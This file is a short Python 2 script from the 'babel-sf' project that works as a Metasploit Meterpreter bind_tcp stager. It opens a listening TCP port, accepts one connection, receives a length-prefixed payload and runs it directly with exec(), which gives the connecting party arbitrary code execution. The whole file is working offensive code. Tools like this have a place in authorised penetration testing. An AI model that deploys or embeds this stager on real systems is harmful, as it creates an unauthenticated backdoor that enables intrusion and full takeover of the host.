#!/usr/bin/python
#
# msf-meterpreter-bind_tcp.py version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#
import socket,struct
import sys
import datetime

i = datetime.datetime.today()

instructions = 	"msf-meterpreter-bind_tcp.py ( https://github.com/attackdebris/babel-sf )\n" +\
		"\nUsage:" +\
		"\npython msf-meterpreter-bind_tcp.py [bind port]" +\
		"\ne.g. python msf-meterpreter-bind_tcp.py 4444"

if len(sys.argv) <2:
	print instructions
elif len(sys.argv) >2:
	print "Too many arguments, check your syntax."
elif len(sys.argv) ==2:
	port=int(sys.argv[1])
	s=socket.socket(2,1)
	s.bind (('0.0.0.0', port))
	print "Starting msf-meterpreter-bind_tcp.py ( https://github.com/attackdebris/babel-sf ) at %s-%s-%s %s:%s" % (i.year, i.month, i.day, i.hour, i.minute)
	print "Listening on TCP port %s...." % (port)
	s.listen(1)
	c,a=s.accept()
	l=struct.unpack('>I',c.recv(4))[0]
	d=c.recv(4096)
	while len(d)!=l:
	  d+=c.recv(4096)
	exec(d,{'s':c})